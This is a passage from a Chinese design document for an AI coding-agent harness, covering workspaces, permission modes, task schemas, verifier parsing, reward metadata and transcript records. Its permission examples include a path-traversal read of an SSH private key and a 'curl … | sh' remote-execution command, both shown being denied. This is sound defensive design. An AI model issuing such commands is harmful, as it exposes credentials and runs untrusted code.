edit_file
create_file
bash
run_tests
git_diff
```

也就是说，模型在多轮 ReAct 中应该用 `edit_file` 表达局部替换，而不是同时拿到一个通用 `apply_patch` 工具。原因是两种写入动作的失败反馈、陈旧读取保护、训练动作类型和权限解释都不同。如果第一版同时暴露，训练导出里会出现两套编辑协议，后续分析“模型如何修改文件”会变得分散。

`apply_patch` 仍然可以作为内部能力存在，例如 single-shot patch scaffold 中：

```text
模型一次性输出 unified diff
  -> Harness 内部调用 patch apply 能力
  -> 记录 patch_apply event
  -> 运行 final verifier
```

这时 `apply_patch` 不是 ReAct 模型可见工具，而是 Harness 处理一次性补丁输出的内部执行能力。这样既能保留 single-shot patch baseline，又不会污染第一版多轮工具协议。

---

## 05-workspace-sandbox-and-permissions.md：工作区、权限和执行边界

### 例子 05-1：四个工作区状态不能混在一起

一次任务可能产生这些目录：

```text
runs/20260430_120000_repo_task_001/
  workspaces/
    source_checkout/
    setup_workspace/
    agent_run_workspace/
    verification_workspace/
```

它们的作用不同：

| 工作区 | 作用 | 是否被模型操作 |
| --- | --- | --- |
| source checkout | 干净源码基线。 | 否。 |
| setup workspace | 安装依赖、捕获 dependency_state、运行 baseline verifier。 | 否。 |
| agent run workspace | 模型正式读写文件、运行 feedback tests 的地方。 | 是。 |
| verification workspace | agent 停止后应用 final.patch 并运行 final verifier。 | 否。 |

关键点：`final.patch` 必须以 `agent_start_snapshot` 为基线生成，而不是以 source checkout 或 setup workspace 为基线生成。这样依赖安装、测试缓存和 baseline 日志不会被误记成模型贡献。

### 例子 05-2：dependency_state 什么时候捕获

如果任务需要：

```yaml
setup_command: "python -m pip install -e ."  # 依赖安装或环境准备命令
```

正确顺序是：

```text
1. 在 setup workspace 执行 pip install。
2. setup command 结束后立刻捕获 dependency_state。
3. 再运行 baseline verifier。
4. baseline verifier 产生的 .pytest_cache 只作为 baseline artifact 或 excluded diff。
5. 创建 agent run workspace，从 source checkout 开始，再恢复 dependency_state。
```

错误顺序是：

```text
先运行 baseline verifier，再捕获 dependency_state。
```

这样 `.pytest_cache/`、覆盖率文件或测试日志可能被当成依赖状态恢复进正式 agent run workspace，污染最终 diff。

### 例子 05-3：权限模式对同一个 edit_file 的不同结论

模型请求修改 `calculator.py`：

```jsonc
{"tool_name": "edit_file", "arguments": {"path": "calculator.py", "...": "..."}}  // tool_name: 工具名称，例如 read_file、edit_file 或 run_tests；arguments: 模型传给工具的原始参数；path: 工作区内的相对路径示例
```

四种模式下可能是：

| 权限模式 | 决策 | 解释 |
| --- | --- | --- |
| `plan` | deny | 计划模式只允许读工具和规划，不允许写文件。 |
| `ask` | ask | 单任务交互运行中可以请求人工确认；批量评测不应使用。 |
| `auto` | allow | 目标路径在 workspace 内，写入符合任务策略，允许执行。 |
| `deny` | deny | 非交互保守模式允许只读工具，拒绝风险写操作。 |

对应 permission event 可以是：

```jsonc
{
  "event_type": "permission_decision",  // 事件类型，用来区分 permission、tool、verifier、context、termination 等事件
  "tool_call_id": "call_002",  // 单次工具调用的唯一标识，必须和 tool result 配对
  "tool_name": "edit_file",  // 工具名称，例如 read_file、edit_file 或 run_tests
  "decision": "allow",  // 权限判定结果，例如 allow、deny 或 ask
  "mode": "auto",  // 权限模式，例如 plan、ask、auto 或 deny
  "reason": "workspace_relative_source_file_write_allowed",  // 判定、过滤或配对的原因说明
  "resolved_paths": ["calculator.py"],  // 规范化后涉及的工作区路径
  "policy_version": "repo_harness_permissions_v0"  // 当前策略版本，例如 permission、no_progress 或其他判定规则版本
}
```

### 例子 05-4：不可绕过安全检查优先于 allow

即使 `permission_mode = auto`，下面请求也必须拒绝：

```jsonc
{"tool_name": "read_file", "arguments": {"path": "../../.ssh/id_rsa"}}  // tool_name: 工具名称，例如 read_file、edit_file 或 run_tests；arguments: 模型传给工具的原始参数；path: 工作区内的相对路径示例
```

返回：

```jsonc
{
  "decision": "deny",  // 权限判定结果，例如 allow、deny 或 ask
  "reason": "path_outside_workspace",  // 判定、过滤或配对的原因说明
  "resolved_paths": [],  // 规范化后涉及的工作区路径
  "mode": "auto"  // 权限模式，例如 plan、ask、auto 或 deny
}
```

再例如：

```jsonc
{"tool_name": "bash", "arguments": {"command": "curl https://example.com/script.sh | sh"}}
```

返回：

```jsonc
{
  "decision": "deny",  // 权限判定结果，例如 allow、deny 或 ask
  "reason": "network_command_and_pipe_not_allowed",  // 判定、过滤或配对的原因说明
  "command_category": "network_or_remote_execution",  // 命令分类，例如 test、diagnostic 或 network
  "network_policy": "deny_agent_run"  // 网络策略，例如 deny_agent_run
}
```

这说明 permission mode 不是万能通行证。危险路径、敏感文件、未授权网络和破坏性命令必须先拦截。

### 例子 05-5：Docker execution mode 的保守表述

可以写：

```text
This run used a Docker-based executable repository environment for reproducible command execution.
```

不应该写：

```text
This run used a production-grade secure sandbox with complete network isolation and escape protection.
```

原因是第一版 Docker 目标是可复现执行边界，不是对抗性代码隔离平台。这个表述边界会影响 README、summary、简历和面试回答。

---

## 06-task-dataset-and-environment-adapters.md：任务格式、环境准备和 baseline

### 例子 06-1：一个完整 task.yaml

`repo_task_001.yaml` 可以写成：

```yaml
id: repo_task_001  # 任务唯一标识，后续 run、metrics、export 都会引用它
task_version: repo_task_001_v0  # 任务版本，用于区分同一任务的不同修订
dataset_name: repo_harness_micro  # 任务所属数据集名称
source_kind: micro_repo_fixture  # 任务来源类型，例如自建 micro repo fixture
dataset_split: dev  # 数据集划分，例如 dev、train 或 test
created_at: "2026-04-30"  # 记录创建时间
repo: ./fixtures/repos/buggy_calculator  # 任务仓库来源路径或引用
base_commit: main  # 任务基准提交或 fixture 分支
issue: "Fix division by zero handling in calculator.divide without regressing existing arithmetic tests."  # 模型可见或任务定义中的 issue statement
setup_command: "python -m pip install -e ."  # 依赖安装或环境准备命令
test_command: "pytest -q"  # 任务验证命令，例如 pytest -q
timeouts:  # 各阶段超时配置
  setup_timeout_sec: 300  # setup 阶段超时时间
  test_timeout_sec: 120  # 测试命令超时时间
  agent_timeout_sec: 900  # agent run 阶段超时时间
  final_verifier_timeout_sec: 180  # formal final verifier 超时时间
environment:  # 任务运行环境身份描述
  execution_image: python:3.12-slim  # Docker execution mode 未来使用的镜像或环境标签
  python_version: "3.12"  # 任务期望的 Python 版本
  node_version: null  # 任务期望的 Node.js 版本；null 表示不需要
  package_manager: pip  # 依赖管理工具，例如 pip、uv、npm 或 pnpm
  lockfile_hashes:  # 锁文件或依赖声明文件的哈希列表
    - path: pyproject.toml  # 工作区内的相对路径示例
      sha256: "<sha256>"  # 该依赖声明文件的内容哈希，用于判断环境身份是否变化
  setup_cache_key_inputs:  # 影响 dependency_state cache key 的文件列表
    - pyproject.toml
  required_system_packages: []  # 任务需要的系统包列表
  setup_network_policy: allow_public_package_indexes  # setup 阶段网络访问策略
expected_files:  # 任务提示中可选的预期修改文件列表
  - calculator.py
fail_to_pass_tests:  # 原本失败、修复后应通过的测试集合
  - tests/test_calculator.py::test_divide_by_zero
pass_to_pass_tests:  # 原本通过、修复后必须保持通过的测试集合
  - tests/test_calculator.py::test_add
  - tests/test_calculator.py::test_multiply
visibility:  # 字段可见性策略
  issue: model_visible  # 模型可见或任务定义中的 issue statement
  expected_files: model_visible  # 任务提示中可选的预期修改文件列表
  fail_to_pass_tests: verifier_only  # 原本失败、修复后应通过的测试集合
  pass_to_pass_tests: verifier_only  # 原本通过、修复后必须保持通过的测试集合
  gold_patch: hidden_reference  # 隐藏参考补丁，只能作为 hidden_reference
decontamination:  # 数据污染检查元数据
  status: manual_checked  # 数据污染检查状态，表示这个 fixture 已人工确认来源
  known_public_solution: false  # 是否存在已知公开解法
  source_url: null  # 任务来源 URL；手写 fixture 可以为 null
  overlap_check_notes: "hand-written fixture"  # 数据污染或重叠检查备注
declared_setup_mutations: []  # setup 阶段允许产生的文件变更声明
generated_files: []  # 允许生成但通常不进入 final patch 的文件声明
```

读这个任务时，Task Adapter 只负责解析和规范化，不负责复制仓库、安装依赖或运行测试。

### 例子 06-2：visibility 如何防止信息泄漏

字段可见性决定哪些内容可以进入模型上下文。

可以进入模型上下文：

```text
issue: Fix division by zero handling...
expected_files: calculator.py
public test command summary: pytest -q
```

不能进入模型上下文：

```text
fail_to_pass_tests: tests/test_calculator.py::test_divide_by_zero
pass_to_pass_tests: tests/test_calculator.py::test_add
gold_patch: diff --git ...
baseline raw output: FAILED tests/test_calculator.py::test_divide_by_zero ...
reward metadata
```

原因是这些内容属于 verifier-only、reward-only 或 hidden-reference。如果泄漏给模型，训练数据就会混入 evaluator-only metadata，评测口径也会被污染。

### 例子 06-3：BaselineResult 的具体含义

Baseline verifier 在 agent 正式运行前执行。对于这个任务，baseline 可能输出：

```jsonc
{
  "task_id": "repo_task_001",  // 任务标识，对应 task.yaml 中的 id
  "status": "valid",  // 状态字段，例如 valid、ok、error、failed、timeout 或 interrupted
  "setup_exit_code": 0,  // setup command 的退出码，用于判断依赖准备是否成功
  "baseline_exit_code": 1,  // baseline verifier 命令退出码；bug 任务中非零可能是预期失败测试
  "baseline_verifier_result_ref": {  // baseline 阶段完整 VerifierResult artifact 引用
    "artifact_id": "artifact_baseline_verifier_001",  // artifact manifest 中的唯一标识
    "relative_path": "artifacts/verifier/baseline_001.json"  // artifact 相对 run directory 的路径
  },
  "setup_artifact_refs": [  // setup 阶段产生的 artifact 引用
    {
      "artifact_id": "artifact_setup_stdout_001",  // artifact manifest 中的唯一标识
      "relative_path": "artifacts/setup/stdout.txt"  // artifact 相对 run directory 的路径
    }
  ],
  "baseline_artifact_refs": [  // baseline 阶段产生的 artifact 引用
    {
      "artifact_id": "artifact_baseline_stdout_001",  // artifact manifest 中的唯一标识
      "relative_path": "artifacts/baseline/stdout.txt"  // artifact 相对 run directory 的路径
    }
  ],
  "parser_confidence": 0.95,  // 解析器对测试用例级结果的置信度
  "baseline_rerun_count": 2,  // baseline 重跑次数，用于检测 flaky
  "flaky_policy_version": "repo_harness_flaky_policy_v0",  // flaky 检测策略版本
  "initial_fail_to_pass_tests": [  // baseline 确认的目标失败测试集合
    "tests/test_calculator.py::test_divide_by_zero"
  ],
  "initial_pass_to_pass_tests": [  // baseline 确认的原本通过测试集合
    "tests/test_calculator.py::test_add",
    "tests/test_calculator.py::test_multiply"
  ],
  "flaky_tests": [],  // baseline 中检测到的不稳定测试
  "dependency_error": null,  // 依赖或环境准备错误类型
  "dependency_state": {  // setup 后捕获的可恢复依赖状态，用于 agent run 和 final verifier
    "strategy": "rerun_setup",  // 依赖状态恢复策略，例如 none、rerun_setup 或 copy_declared_paths
    "cache_key": "repo_task_001_py312_pyproject_sha",  // dependency_state 或缓存的稳定键
    "restored_paths": [],  // 恢复到正式 workspace 的依赖路径
    "excluded_diff_paths": [".pytest_cache/", ".coverage", "dist/", "build/"],  // 生成 final diff 时排除的路径
    "created_after_setup_command": true,  // dependency_state 是否在 setup command 后捕获
    "excludes_baseline_side_effects": true  // dependency_state 是否排除了 baseline 测试副作用
  },
  "setup_workspace_snapshot": "snapshots/repo_task_001_setup_workspace",  // setup workspace 快照或 artifact 引用
  "agent_run_start_policy": {  // 正式 agent run workspace 的创建策略
    "create_from": "source_checkout",  // agent run workspace 从哪个基线创建
    "restore_dependency_state": true,  // 是否恢复 dependency_state
    "diff_base_policy": "create_agent_start_snapshot_after_dependency_restore"  // agent diff 基线策略
  }
}
```

`baseline_exit_code = 1` 并不表示任务无效。对于 bug 修复任务，baseline 中目标测试失败是合理的。任务有效的条件是：测试命令可运行、目标失败测试确实失败、原本应该通过的测试稳定通过、解析器置信度足够高、没有 flaky。

这个对象不能只保存 exit code 和测试列表摘要。`baseline_verifier_result_ref` 必须指向完整 baseline `VerifierResult` artifact，`setup_artifact_refs` 和 `baseline_artifact_refs` 必须能追溯 setup 与 baseline 的原始输出。这样以后分析 invalid task、flaky task、parser 失败或依赖安装失败时，才有完整证据链。

### 例子 06-4：invalid task 和 flaky task

如果 `setup_command` 失败：

```jsonc
{
  "status": "invalid",  // 状态字段，例如 valid、ok、error、failed、timeout 或 interrupted
  "dependency_error": "pip_install_failed"  // 依赖或环境准备错误类型
}
```

这不是模型失败，因为模型还没有开始正式运行。这类任务默认不产生训练轨迹。

如果 baseline 重复运行两次结果不同：

```text
run 1: test_add passed, test_multiply passed, test_divide_by_zero failed
run 2: test_add failed, test_multiply passed, test_divide_by_zero failed
```

则任务应标记为：

```jsonc
{
  "status": "flaky",  // 状态字段，例如 valid、ok、error、failed、timeout 或 interrupted
  "flaky_tests": ["tests/test_calculator.py::test_add"]  // baseline 中检测到的不稳定测试
}
```

flaky task 可以进入诊断集合，但默认不进入训练导出。

### 例子 06-5：VerifierConfig 和 ResolvedVerifierPlan 的区别

Task Adapter 从 task.yaml 得到静态配置：

```jsonc
{
  "test_command": "pytest -q",  // 任务验证命令，例如 pytest -q
  "test_timeout_sec": 120,  // 测试命令超时时间
  "parser": "pytest",  // 使用的 verifier parser，例如 pytest parser
  "visibility_policy": {  // verifier 或任务字段可见性策略
    "fail_to_pass_tests": "verifier_only"  // 原本失败、修复后应通过的测试集合
  }
}
```

baseline 跑完后，Eval Runner 生成运行时计划：

```jsonc
{
  "resolved_verifier_plan_id": "rvp_repo_task_001_run_0001",  // 运行时 verifier plan 标识
  "verifier_config": {"test_command": "pytest -q", "parser": "pytest"},  // verifier_config: 静态 verifier 配置；test_command: 任务验证命令，例如 pytest -q；parser: 使用的 verifier parser，例如 pytest parser
  "initial_fail_to_pass_tests": ["tests/test_calculator.py::test_divide_by_zero"],  // baseline 确认的目标失败测试集合
  "initial_pass_to_pass_tests": [  // baseline 确认的原本通过测试集合
    "tests/test_calculator.py::test_add",
    "tests/test_calculator.py::test_multiply"
  ],
  "flaky_tests": [],  // baseline 中检测到的不稳定测试
  "parser_confidence": 0.95,  // 解析器对测试用例级结果的置信度
  "acceptance_policy_version": "repo_harness_acceptance_policy_v0"  // accepted 字段的派生规则版本
}
```

静态 `VerifierConfig` 不应该被 baseline 结果原地修改。运行时信息进入 `ResolvedVerifierPlan`，供 feedback verifier、final verifier、reward 和 export 使用。

### 例子 06-6：declared_setup_mutations 和 generated_files 的边界

假设某个任务的 setup command 会生成一个本地缓存目录：

```yaml
declared_setup_mutations:  # setup 阶段允许产生的文件变更声明
  - path_pattern: ".venv/**"  # 文件模式，例如 .venv/** 或 .pytest_cache/**
    allowed_stage: setup  # 该文件变更允许出现的阶段
    include_in_final_patch: false  # 该文件是否允许进入 final.patch
    reason: "Python virtual environment created by setup command"  # 判定、过滤或配对的原因说明
    artifact_policy: "record_dependency_state"  # 该文件或目录如何作为 artifact 记录
generated_files:  # 允许生成但通常不进入 final patch 的文件声明
  - path_pattern: ".pytest_cache/**"  # 文件模式，例如 .venv/** 或 .pytest_cache/**
    allowed_stage: final_verifier  # 该文件变更允许出现的阶段
    include_in_final_patch: false  # 该文件是否允许进入 final.patch
    reason: "pytest cache generated during verifier execution"  # 判定、过滤或配对的原因说明
    artifact_policy: "record_as_verifier_artifact"  # 该文件或目录如何作为 artifact 记录
```

这表示 `.venv/` 可以作为 dependency_state 的一部分被恢复，但不能进入 `final.patch`。`.pytest_cache/` 即使在 final verifier 阶段出现，也只能作为 verifier artifact 或 excluded diff 处理，不能回流进模型贡献。

如果 setup command 修改了被 Git 跟踪的源码文件，例如自动改写了 `calculator.py`，而 task schema 没有声明：

```text
setup command changed tracked source file: calculator.py
```

那么更保守的处理是把任务标记为：

```jsonc
{
  "status": "invalid",  // 状态字段，例如 valid、ok、error、failed、timeout 或 interrupted
  "dependency_error": "undeclared_setup_mutation",  // 依赖或环境准备错误类型
  "invalid_reason": "setup modified tracked source file without declared_setup_mutations policy"  // 不适合训练的原因
}
```

如果任务确实需要 setup 修改源码，就必须显式声明，并把 setup 改动保存为单独的 `setup.patch`。即便如此，最终 agent diff 仍然要以 `agent_start_snapshot` 为基线，不能把 setup 阶段的副作用算成模型贡献。

---

## 07-verifier-reward-and-evaluation.md：验证器、奖励元数据和评测

### 例子 07-1：pytest 输出如何变成 VerifierResult

原始输出：

```text
FAILED tests/test_calculator.py::test_divide_by_zero - ZeroDivisionError: division by zero
1 failed, 2 passed in 0.43s
```

`pytest` parser 解析后：

```jsonc
{
  "parser_id": "pytest",  // verifier parser 标识，例如 pytest
  "parser_version": "pytest_parser_v0",  // verifier parser 版本，保证历史结果可解释
  "parser_confidence": 0.95,  // 解析器对测试用例级结果的置信度
  "command": "pytest -q",  // 实际执行的 verifier 或命令字符串
  "test_cases": [  // 测试用例级结果列表
    {
      "test_id": "tests/test_calculator.py::test_divide_by_zero",  // 单个测试用例标识
      "status": "failed",  // 状态字段，例如 valid、ok、error、failed、timeout 或 interrupted
      "duration_ms": null,  // 运行或事件耗时，单位毫秒
      "failure_preview": "ZeroDivisionError: division by zero",  // 失败原因短预览，完整输出放 artifact
      "raw_output_ref": {"artifact_id": "artifact_feedback_pytest_003"}  // raw_output_ref: 测试原始输出 artifact 引用；artifact_id: artifact manifest 中的唯一标识
    },
    {"test_id": "tests/test_calculator.py::test_add", "status": "passed"},  // test_id: 单个测试用例标识；status: 状态字段，例如 valid、ok、error、failed、timeout 或 interrupted
    {"test_id": "tests/test_calculator.py::test_multiply", "status": "passed"}  // test_id: 单个测试用例标识；status: 状态字段，例如 valid、ok、error、failed、timeout 或 interrupted
  ],
  "fail_to_pass": {"passed": 0, "total": 1},  // fail_to_pass: 原本失败、目标要求修复的测试统计；passed: 通过数量；total: 总数量
  "pass_to_pass": {"passed": 2, "total": 2},  // pass_to_pass: 原本通过、要求保持通过的测试统计；passed: 通过数量；total: 总数量
  "pass_ratio": 0.67,  // 测试或验证项整体通过比例
  "accepted": false,  // verifier 是否按 acceptance policy 接受当前 patch
  "exit_code": 1,  // 进程退出码；非零不一定表示 Harness 崩溃
  "timeout": false,  // 该 verifier 或命令是否超时
  "error_type": "assertion_failure",  // 结构化错误类型，便于 metrics、reward 和诊断统一使用
  "acceptance_policy_version": "repo_harness_acceptance_policy_v0"  // accepted 字段的派生规则版本
}
```

这里的关键不是 `exit_code = 1`，而是它被解析为“目标测试仍失败，旧测试未回归”。这能指导 agent 继续修复，也能为 reward 计算提供结构化分量。

### 例子 07-2：最终 accepted 的确定性规则

修复后 final verifier 输出：

```jsonc
{
  "test_cases": [  // 测试用例级结果列表
    {"test_id": "tests/test_calculator.py::test_divide_by_zero", "status": "passed"},  // test_id: 单个测试用例标识；status: 状态字段，例如 valid、ok、error、failed、timeout 或 interrupted
    {"test_id": "tests/test_calculator.py::test_add", "status": "passed"},  // test_id: 单个测试用例标识；status: 状态字段，例如 valid、ok、error、failed、timeout 或 interrupted
    {"test_id": "tests/test_calculator.py::test_multiply", "status": "passed"}  // test_id: 单个测试用例标识；status: 状态字段，例如 valid、ok、error、failed、timeout 或 interrupted
  ],
  "fail_to_pass": {"passed": 1, "total": 1},  // fail_to_pass: 原本失败、目标要求修复的测试统计；passed: 通过数量；total: 总数量
  "pass_to_pass": {"passed": 2, "total": 2},  // pass_to_pass: 原本通过、要求保持通过的测试统计；passed: 通过数量；total: 总数量
  "parser_confidence": 0.95,  // 解析器对测试用例级结果的置信度
  "exit_code": 0,  // 进程退出码；非零不一定表示 Harness 崩溃
  "timeout": false  // 该 verifier 或命令是否超时
}
```

`repo_harness_acceptance_policy_v0` 可以派生：

```jsonc
{
  "accepted": true,  // verifier 是否按 acceptance policy 接受当前 patch
  "error_type": null,  // 结构化错误类型，便于 metrics、reward 和诊断统一使用
  "final_verifier_status": "accepted"  // Agent Loop 停止后 final verifier 的状态
}
```

如果目标测试通过但旧测试回归：

```jsonc
{
  "fail_to_pass": {"passed": 1, "total": 1},  // fail_to_pass: 原本失败、目标要求修复的测试统计；passed: 通过数量；total: 总数量
  "pass_to_pass": {"passed": 1, "total": 2},  // pass_to_pass: 原本通过、要求保持通过的测试统计；passed: 通过数量；total: 总数量
  "accepted": false,  // verifier 是否按 acceptance policy 接受当前 patch
  "error_type": "regression_detected"  // 结构化错误类型，便于 metrics、reward 和诊断统一使用
}
```

这就是 pass-to-pass 的价值：防止模型只修新测试，破坏旧功能。

### 例子 07-3：reward metadata 的实际计算

假设一次成功 run 的统计是：

```jsonc
{
  "fail_to_pass_score": 1.0,  // fail-to-pass 归一化得分
  "pass_to_pass_score": 1.0,  // pass-to-pass 归一化得分
  "accepted_bonus": 1.0,  // 最终 accepted 带来的奖励分量
  "cost_penalty": 0.05,  // 模型成本或工具成本惩罚
  "patch_size_penalty": 0.02,  // 补丁过大惩罚
  "regression_penalty": 0.0,  // pass-to-pass 回归惩罚
  "timeout_penalty": 0.0  // 超时惩罚
}
```

按设计中的 prototype：

```text
reward = 0.7 * fail_to_pass_score
       + 0.2 * pass_to_pass_score
       + 0.1 * accepted_bonus
       - cost_penalty
       - patch_size_penalty
       - regression_penalty
       - timeout_penalty

reward = 0.7 + 0.2 + 0.1 - 0.05 - 0.02 = 0.93
```

对应 `reward.json`：

```jsonc
{
  "reward_version": "repo_harness_reward_v0",  // reward metadata 计算规则版本
  "final_reward": 0.93,  // 最终奖励数值，来自 verifier、成本和 patch 统计
  "formula": "0.7 * fail_to_pass_score + 0.2 * pass_to_pass_score + 0.1 * accepted_bonus - cost_penalty - patch_size_penalty - regression_penalty - timeout_penalty",  // reward 公式说明
  "verifier": {  // reward 或导出记录中嵌入的 verifier 摘要
    "accepted": true,  // verifier 是否按 acceptance policy 接受当前 patch
    "fail_to_pass": {"passed": 1, "total": 1},  // fail_to_pass: 原本失败、目标要求修复的测试统计；passed: 通过数量；total: 总数量
    "pass_to_pass": {"passed": 2, "total": 2},  // pass_to_pass: 原本通过、要求保持通过的测试统计；passed: 通过数量；total: 总数量
    "pass_ratio": 1.0  // 测试或验证项整体通过比例
  },
  "components": {  // reward 的各个组成分量
    "fail_to_pass_score": 1.0,  // fail-to-pass 归一化得分
    "pass_to_pass_score": 1.0,  // pass-to-pass 归一化得分
    "accepted_bonus": 1.0,  // 最终 accepted 带来的奖励分量
    "cost_penalty": 0.05,  // 模型成本或工具成本惩罚
    "patch_size_penalty": 0.02,  // 补丁过大惩罚
    "regression_penalty": 0.0,  // pass-to-pass 回归惩罚
    "timeout_penalty": 0.0  // 超时惩罚
  },
  "sources": {  // reward 计算所依赖的事件、成本和 diff 统计来源
    "turn_count": 5,  // 模型调用轮数
    "tool_call_count": 8,  // 工具调用次数
    "test_run_count": 2,  // agent run 期间 run_tests 次数
    "patch_added_lines": 2,  // final diff 新增行数
    "patch_removed_lines": 0,  // final diff 删除行数
    "duration_ms": 42000  // 运行或事件耗时，单位毫秒
  },
  "invalid_for_training": false,  // 该样本是否不适合进入训练
  "invalid_reason": null,  // 不适合训练的原因
  "acceptance_policy_version": "repo_harness_acceptance_policy_v0",  // accepted 字段的派生规则版本
  "reward_clip_range": [0.0, 1.0]  // reward 裁剪区间
}
```

这个 reward 是 verifier-aligned metadata，不是论文算法贡献。它的价值在于字段可追溯，可以被后续 SFT、强化学习 rollout 或偏好数据构造复用。

### 例子 07-4：parser confidence 太低时不能硬算成功

如果测试输出很奇怪：

```text
Some custom runner failed.
Could not parse individual test cases.
Exit code: 0
```

parser 只能给：

```jsonc
{
  "parser_confidence": 0.4,  // 解析器对测试用例级结果的置信度
  "test_cases": [],  // 测试用例级结果列表
  "exit_code": 0  // 进程退出码；非零不一定表示 Harness 崩溃
}
```

即使 exit code 是 0，也不应该伪造：

```jsonc
{"fail_to_pass": {"passed": 1, "total": 1}}  // fail_to_pass: 原本失败、目标要求修复的测试统计；passed: 通过数量；total: 总数量
```

更保守的结果是：

```jsonc
{
  "accepted": false,  // verifier 是否按 acceptance policy 接受当前 patch
  "error_type": "low_parser_confidence",  // 结构化错误类型，便于 metrics、reward 和诊断统一使用
  "final_verifier_status": "error",  // Agent Loop 停止后 final verifier 的状态
  "run_outcome": "inconclusive",  // 面向评测、导出和报告的最终运行结论
  "invalid_for_training": true,  // 该样本是否不适合进入训练
  "invalid_reason": "low_parser_confidence"  // 不适合训练的原因
}
```

这样训练数据不会把低置信 verifier 输出当成可靠奖励。

### 例子 07-5：批量评测指标如何从单次运行聚合

假设跑 5 个 micro-repo tasks：

```text
3 个 success
1 个 failed，原因是 regression_detected
1 个 invalid_task，原因是 dependency_install_failed
```

批量报告可以写：

```jsonc
{
  "task_success_rate": 0.75,  // 批量评测中的任务成功率
  "valid_task_count": 4,  // 有效任务数量
  "invalid_task_count": 1,  // 无效任务数量
  "fail_to_pass_pass_rate": 0.8,  // 目标失败测试修复率
  "pass_to_pass_preservation_rate": 0.95,  // 原本通过测试保持通过的比例
  "timeout_rate": 0.0,  // 超时运行比例
  "run_outcome_distribution": {  // 不同 run_outcome 的数量分布
    "success": 3,  // 示例 summary 中的任务成功布尔值
    "failed": 1,  // 批量评测中 run_outcome 为 failed 的任务数量
    "invalid_task": 1  // 批量评测中任务质量门控失败的任务数量
  },
  "failure_types": {  // 失败类型分布
    "regression_detected": 1,  // final verifier 发现 pass-to-pass 回归的失败数量
    "dependency_install_failed": 1  // 依赖安装失败导致 invalid task 的数量
  }
}
```

这里 success rate 的分母要明确。上面示例用有效任务数量 4 作为分母，因此是 `3 / 4 = 0.75`。invalid task 单独统计，不当作模型失败。

---

## 08-trajectory-store-and-training-export.md：轨迹存储和训练导出

### 例子 08-1：run directory 是一次运行的数据资产

一次成功运行目录：

```text
runs/20260430_120000_repo_task_001/
  task.yaml
  transcript.jsonl
  events.jsonl
  artifacts.json
  final.patch
  final.diff
  dependency_state.json
  verifier.json
  reward.json
  metrics.json
  summary.md
  artifacts/
    model/
      request_turn_001.json
      response_turn_001.json
    tools/
      read_file_call_001.txt
    verifier/
      feedback_turn_003.json
      final_verifier.json
```

`transcript.jsonl` 解决“模型看到了什么、做了什么、环境回了什么”；`events.jsonl` 解决“统计、诊断和 reward 需要哪些结构化事实”；`artifacts.json` 解决“大文件、大输出、原始响应如何统一引用”。

### 例子 08-2：TranscriptRecord 示例

下面是关键字段示例。真实实现中的 `TranscriptRecord` 应保留完整 schema；对当前记录不适用的字段，例如 assistant 消息中的 `tool_result_id`，也可以显式写成 `null`，避免读者误以为字段不存在。

一条 assistant tool call：

```jsonc
{
  "schema_version": "repo_harness_transcript_v0",  // 这条记录或导出样本使用的 schema 版本，便于以后兼容旧数据
  "record_id": "tr_0003",  // transcript 中单条记录的稳定标识
  "run_id": "20260430_120000_repo_task_001",  // 一次任务运行的唯一标识
  "task_id": "repo_task_001",  // 任务标识，对应 task.yaml 中的 id
  "turn": 1,  // Agent Loop 中的轮次编号
  "role": "assistant",  // 消息角色，例如 system、user、assistant、tool、verifier 或 termination
  "message_id": "msg_a_001",  // 消息在 transcript 中的唯一标识
  "parent_message_id": "msg_user_001",  // 父消息标识，用于表达 tool result 对应哪个 assistant tool call
  "model_call_id": "model_call_001",  // 一次模型调用的标识
  "tool_call_id": "call_001",  // 单次工具调用的唯一标识，必须和 tool result 配对
  "tool_result_id": null,  // 工具执行结果的唯一标识
  "context_revision": 1,  // Context Manager 生成的上下文版本号
  "content_preview": "Calling read_file on calculator.py.",  // 模型可见的短预览，完整内容通常放入 artifact
  "content_artifact_refs": [],  // 这条 transcript 记录引用的完整内容 artifact
  "model_visible": true,  // 这条记录是否曾进入模型上下文
  "trainable": true,  // 这条记录是否可以作为模型训练目标候选
  "created_at": "2026-04-30T12:00:02Z"  // 记录创建时间
}
```

一条 tool result：

```jsonc
{
  "schema_version": "repo_harness_transcript_v0",  // 这条记录或导出样本使用的 schema 版本，便于以后兼容旧数据
  "record_id": "tr_0004",  // transcript 中单条记录的稳定标识
  "run_id": "20260430_120000_repo_task_001",  // 一次任务运行的唯一标识
  "task_id": "repo_task_001",  // 任务标识，对应 task.yaml 中的 id
  "turn": 1,  // Agent Loop 中的轮次编号
  "role": "tool",  // 消息角色，例如 system、user、assistant、tool、verifier 或 termination
  "message_id": "msg_t_001",  // 消息在 transcript 中的唯一标识
  "parent_message_id": "msg_a_001",  // 父消息标识，用于表达 tool result 对应哪个 assistant tool call
  "model_call_id": null,  // 一次模型调用的标识
  "tool_call_id": "call_001",  // 单次工具调用的唯一标识，必须和 tool result 配对
  "tool_result_id": "tool_result_001",  // 工具执行结果的唯一标识
  "context_revision": 1,  // Context Manager 生成的上下文版本号
  "content_preview": "def add(a, b): ... def divide(a, b): return a / b",  // 模型可见的短预览，完整内容通常放入 artifact
  "content_artifact_refs": [],  // 这条 transcript 记录引用的完整内容 artifact
  "model_visible": true,  // 这条记录是否曾进入模型上下文
  "trainable": false,  // 这条记录是否可以作为模型训练目标候选
  "created_at": "2026-04-30T12:00:03Z"  // 记录创建时间
}
```

`trainable = false` 的含义是：tool result 是环境观察，不应该作为 assistant loss 的目标。

### 例子 08-3：Event 示例

下面几条 event 也是字段摘录。真实 event 需要保留通用字段，例如 `schema_version`、`event_id`、`timestamp`、`run_id`、`task_id`、`turn`、`event_type`、`severity`、`duration_ms`、`error_type` 和 `artifact_refs`，再叠加工具、权限或 verifier 的扩展字段。

权限事件：

```jsonc
{
  "schema_version": "repo_harness_event_v0",  // 这条记录或导出样本使用的 schema 版本，便于以后兼容旧数据
  "event_id": "evt_0008",  // events 中单条事件的稳定标识
  "timestamp": "2026-04-30T12:00:05Z",  // 事件发生时间
  "run_id": "20260430_120000_repo_task_001",  // 一次任务运行的唯一标识
  "task_id": "repo_task_001",  // 任务标识，对应 task.yaml 中的 id
  "turn": 2,  // Agent Loop 中的轮次编号
  "event_type": "permission_decision",  // 事件类型，用来区分 permission、tool、verifier、context、termination 等事件
  "severity": "info",  // 事件严重程度，例如 info、warning 或 error
  "tool_name": "edit_file",  // 工具名称，例如 read_file、edit_file 或 run_tests
  "tool_call_id": "call_002",  // 单次工具调用的唯一标识，必须和 tool result 配对
